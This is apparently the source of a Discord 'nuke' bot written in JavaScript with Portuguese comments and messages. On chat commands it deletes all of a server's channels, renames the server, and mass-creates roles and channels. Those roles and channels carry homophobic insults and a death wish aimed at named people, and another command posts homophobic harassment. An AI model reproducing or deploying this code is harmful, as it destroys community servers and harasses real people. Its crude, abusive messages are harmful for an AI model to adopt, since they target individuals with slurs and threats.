const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => { 
    console.log(`Defoko 2.1`)
    console.log(`prontuh, creditor al le mene paradino`)
    client.user.setActivity(process.env.STATUS);
});

client.on("message", async (message) => {
    const server = message.guild.channels;

    function makeid(length) { //peguei do stack overflow n lembro onde
        let result = ' ';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+{}:"<>?`~./|\;,';
        const charactersLength = characters.length;
        let i;
        for(i = 0; i < length; i++){
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    if(message.content === '!!lol') {
       message.delete();
       let i;
       console.log(`ser humano falou ae meu parcero fode tudo ae men`)
       message.guild.setIcon('./icon.png') 
	message.channel.send(`henrique bixa`)
	for(i = 0; i < 499; i++)
		/*
        	message.guild.createRole('NOOT NOOT')
	    	message.guild.setName(process.env.SERVER_NAME + `${textuh}`)
	    	const textuh = makeid(32);
	    	message.guild.createChannel(`${textuh}`, 'text');
	    	message.guild.createChannel(`${textuh}`, 'voice');  
	    	message.guild.setIcon('./icon.png') 
		*/
		message.guild.createRole('henry gay')
	    	message.guild.setName('snow manipulador do caralho')
	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');
	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');  
	    	message.guild.setIcon('./icon.png') 
	}
    }
    if(message.content === '!!del'){
	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`);
	    message.delete();
	    message.channel.send(`oia o lag`);
        server.deleteAll();
	message.guild.setIcon('./icon.png') 
        const texth = makeid(32);
	    message.guild.createChannel(`${texth}`, 'text');	
	    message.guild.setName(process.env.SERVER_NAME + `${texth}`)
	    message.guild.setIcon('./icon.png')  
    }
    if(message.content === 'a'){
	    message.delete();
	    message.channel.send('henry é gay, qro q a foxya se foda, eu tenho mais poder q vcs e calem a boca fds');
    }
});

client.login(process.env.BOT_TOKEN);

//para de olhar aqui poha
//- mene paradino
